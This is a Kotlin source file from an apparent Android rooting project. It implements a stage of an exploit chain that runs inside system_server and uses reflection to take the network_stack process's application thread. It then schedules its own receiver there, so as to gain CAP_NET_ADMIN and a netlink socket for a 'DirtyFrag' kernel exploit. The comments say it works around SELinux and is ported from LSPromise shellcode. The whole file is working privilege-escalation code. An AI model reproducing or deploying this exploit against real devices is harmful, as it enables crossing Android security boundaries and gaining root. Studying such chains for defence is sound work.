package com.polygraphene.df.reroot

import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Process
import android.util.ArrayMap
import android.util.Log

/**
 * system_server -> network_stack hop, ported from LSPromise Shellcode.stage1
 * (LSPosed/LSPromise).
 *
 * Differences from the original: LSPromise reached this code via the Telecom
 * AppComponentFactory bug; we are ALREADY inside system_server (hosted via
 * sharedUserId + process="system"), so this runs on demand (button/boot).
 * Pure reflection, no android.app.* shims needed: hidden entry points are
 * resolved at runtime from the system_server process, the same context the
 * original exploit ran in.
 *
 * Why the hop exists (unchanged): system_server cannot dlopen /data native
 * libs nor mmap executable memory (SELinux), while com.android.networkstack
 * can do both AND holds netlink_xfrm_socket + CAP_NET_ADMIN for DirtyFrag.
 */
object StageHop {
    const val TAG = "DFReroot"
    const val PKG = "com.polygraphene.df.reroot"
    const val NETWORK_STACK_PROCESS = "com.android.networkstack.process"
    const val NETWORK_STACK_UID = 1073

    /** Steal network_stack's IApplicationThread and bounce our StageReceiver there. */
    fun hopToNetworkStack(context: Context): String {
        val log = StringBuilder()
        Diagnostics.processIdentity(context, "system_server", log)
        try {
            val appInfo = context.packageManager.getApplicationInfo(context.packageName, 0)
            log.appendLine("[*] appInfo=$appInfo")
            val receiverInfo = ActivityInfo().apply {
                applicationInfo = appInfo
                name = StageReceiver::class.java.name
            }
            val intent = Intent().setClassName(appInfo.packageName, receiverInfo.name)

            val smClass = Class.forName("android.os.ServiceManager")
            val ams = smClass.getMethod("getService", String::class.java)
                .invoke(null, Context.ACTIVITY_SERVICE)
                ?: throw RuntimeException("ActivityService handle is null")
            log.appendLine("[*] got ActivityManagerService")
            val amsClass = ams.javaClass.classLoader!!
                .loadClass("com.android.server.am.ActivityManagerService")
            Diagnostics.dumpAmsShape(ams, amsClass, log)  // Gate C.1
            // ProcessRecord lookup, tolerant to per-build signature drift
            // (e.g. getProcessRecordLocked(String,int) vs (String,int,boolean)).
            val pr = findProcessRecord(ams, amsClass, log)
                ?: throw RuntimeException("networkstack ProcessRecord not found (is it running?)")
            log.appendLine("[*] networkstack ProcessRecord=$pr")
            log.appendLine("[*] pr class=${pr.javaClass.name}")
            Diagnostics.dumpProcessRecordShape(pr, log)  // Gate C.2
            val thread = findAppThread(pr, log)
                ?: throw RuntimeException("oneway thread not found (see *hread* candidates above)")
            Diagnostics.dumpAppThreadShape(thread, log)  // Gate C.3
            // scheduleReceiver(Intent, ActivityInfo, CompatibilityInfo, int, String,
            //   Bundle, boolean, boolean, int, int, int, String) — 12 params.
            val m = thread.javaClass.methods
                .firstOrNull { it.name == "scheduleReceiver" && it.parameterCount == 12 }
                ?: throw RuntimeException("scheduleReceiver/12 not found")
            m.invoke(
                thread, intent, receiverInfo, null, 0, null, null,
                false, false, 0, 0, Process.SYSTEM_UID, "android"
            )
            log.appendLine("[+] scheduleReceiver sent; watch logcat for StageReceiver in network_stack")
        } catch (e: Exception) {
            log.appendLine("[x] hop failed: $e")
            Log.e(TAG, "hop failed", e)
        }
        // Mirror everything to logcat: remote diagnosis needs the full trace,
        // the on-screen log alone is easy to truncate.
        for (line in log.toString().lines()) {
            Log.i(TAG, line)
        }
        return log.toString()
    }

    /**
     * Extract IApplicationThread from a ProcessRecord across OEM revisions.
     * S26/OneUI reality (logcat-proven): no getOnewayThread(), no `thread`
     * field; instead `mOnewayThread` (+ `mThread`). Order: newest known
     * fields first, then legacy method/field, then give up with diagnostics.
     */
    private fun findAppThread(pr: Any, log: StringBuilder): Any? {
        for (name in listOf("mOnewayThread", "mThread", "thread")) {
            try {
                val f = pr.javaClass.getDeclaredField(name).apply { isAccessible = true }
                log.appendLine("[*] field $name type=${f.type.name}")
                val r = f.get(pr)
                if (r != null) {
                    log.appendLine("[+] via $name field")
                    return r
                }
                log.appendLine("[!] $name field is null (process without app thread?)")
            } catch (e: Exception) {
                log.appendLine("[!] $name field failed: $e")
            }
        }
        val methods = try {
            pr.javaClass.methods.filter { it.name.contains("hread", ignoreCase = true) }
        } catch (e: Exception) {
            log.appendLine("[!] method enumeration failed: $e")
            emptyList()
        }
        log.appendLine(
            "[*] *hread* methods: " +
                methods.map { m -> m.name + m.parameterTypes.map { it.simpleName } }
        )
        methods.firstOrNull { it.name == "getOnewayThread" && it.parameterCount == 0 }
            ?.let { m ->
                try {
                    m.isAccessible = true
                    val r = m.invoke(pr)
                    if (r != null) {
                        log.appendLine("[+] via getOnewayThread()")
                        return r
                    }
                } catch (e: Exception) {
                    log.appendLine("[!] getOnewayThread() failed: $e")
                }
            }
        try {
            val fields = pr.javaClass.declaredFields
                .map { it.name }
                .filter { it.contains("hread", ignoreCase = true) }
            log.appendLine("[*] *hread* fields: $fields")
        } catch (e2: Exception) {
            log.appendLine("[!] field dump failed: $e2")
        }
        return null
    }

    /**
     * Locate network_stack's ProcessRecord across AMS revisions:
     *  1) any getProcessRecordLocked overload ((String,int) preferred,
     *     then (String,int,boolean) with keepIfLarge=false),
     *  2) the mProcessNames map (ams.mProcessList.mProcessNames.get(name,uid)),
     *     whose ProcessMap.get(String,int) API is ancient and stable.
     * Overload shapes are logged so the next mismatch is diagnosable on sight.
     */
    private fun findProcessRecord(ams: Any, amsClass: Class<*>, log: StringBuilder): Any? {
        val overloads = try {
            amsClass.declaredMethods.filter { it.name == "getProcessRecordLocked" }
        } catch (e: Exception) {
            log.appendLine("[!] cannot enumerate AMS methods: $e")
            emptyList()
        }
        log.appendLine(
            "[*] getProcessRecordLocked overloads: " +
                overloads.map { m -> m.parameterTypes.map { it.simpleName } }
        )
        overloads.firstOrNull { it.parameterTypes.size == 2 }?.let { m ->
            try {
                m.isAccessible = true
                val r = synchronized(ams) {
                    m.invoke(ams, NETWORK_STACK_PROCESS, NETWORK_STACK_UID)
                }
                if (r != null) {
                    log.appendLine("[+] via getProcessRecordLocked(String,int)")
                    return r
                }
                log.appendLine("[!] 2-arg overload returned null, trying others")
            } catch (e: Exception) {
                log.appendLine("[!] 2-arg overload failed: $e")
            }
        }
        overloads.firstOrNull { it.parameterTypes.size == 3 }?.let { m ->
            try {
                m.isAccessible = true
                val r = synchronized(ams) {
                    m.invoke(ams, NETWORK_STACK_PROCESS, NETWORK_STACK_UID, false)
                }
                if (r != null) {
                    log.appendLine("[+] via getProcessRecordLocked(String,int,boolean)")
                    return r
                }
            } catch (e: Exception) {
                log.appendLine("[!] 3-arg overload failed: $e")
            }
        }
        try {
            val pl = amsClass.getDeclaredField("mProcessList")
                .apply { isAccessible = true }.get(ams)
                ?: throw RuntimeException("mProcessList is null")
            val names = pl.javaClass.getDeclaredField("mProcessNames")
                .apply { isAccessible = true }.get(pl)
                ?: throw RuntimeException("mProcessNames is null")
            val get = names.javaClass.getMethod(
                "get", String::class.java, Int::class.javaPrimitiveType
            )
            val r = synchronized(names) {
                get.invoke(names, NETWORK_STACK_PROCESS, NETWORK_STACK_UID)
            }
            if (r != null) {
                log.appendLine("[+] via mProcessNames map")
                return r
            }
            log.appendLine("[!] map path returned null")
        } catch (e: Exception) {
            log.appendLine("[!] map path failed: $e")
            try {
                // No instance needed: list candidate fields from the type itself.
                val plType = amsClass.getDeclaredField("mProcessList").type
                val fields = plType.declaredFields
                    .map { it.name }
                    .filter { it.contains("rocess", ignoreCase = true) }
                log.appendLine("[*] ProcessList *rocess* fields: $fields")
            } catch (e2: Exception) {
                log.appendLine("[!] field dump failed: $e2")
            }
        }
        return null
    }

    /**
     * Drop cached LoadedApk/classloaders for our package so a re-run picks up
     * an updated APK. Best-effort port of LSPromise cleanupLoadedApk; failures
     * are logged, never fatal (stale dex just means reinstall-then-retry).
     */
    fun cleanupLoadedApk(context: Context): String {
        return try {
            val atClass = Class.forName("android.app.ActivityThread")
            val at = atClass.getMethod("currentActivityThread").invoke(null)
            @Suppress("UNCHECKED_CAST")
            val packages = atClass.getDeclaredField("mPackages").apply { isAccessible = true }
                .get(at) as ArrayMap<String, *>
            val resMgr = atClass.getDeclaredField("mResourcesManager").apply { isAccessible = true }
                .get(at)
            synchronized(resMgr!!) {
                (packages as ArrayMap<String, Any?>).remove(context.packageName)
            }
            val sApps = Class.forName("android.app.LoadedApk")
                .getDeclaredField("sApplications").apply { isAccessible = true }
                .get(null) as ArrayMap<String, *>
            synchronized(sApps) {
                (sApps as ArrayMap<String, Any?>).remove(context.packageName)
            }
            val loadersClass = Class.forName("android.app.ApplicationLoaders")
            val def = loadersClass.getMethod("getDefault").invoke(null)
            @Suppress("UNCHECKED_CAST")
            val loaders = loadersClass.getDeclaredField("mLoaders").apply { isAccessible = true }
                .get(def) as ArrayMap<String, ClassLoader>
            val mine = StageHop::class.java.classLoader
            synchronized(loaders) {
                val idx = loaders.indexOfValue(mine)
                if (idx >= 0) loaders.removeAt(idx)
            }
            "[*] cleanupLoadedApk ok"
        } catch (e: Exception) {
            Log.e(TAG, "cleanupLoadedApk failed (non-fatal)", e)
            "[!] cleanupLoadedApk skipped: $e"
        }
    }
}
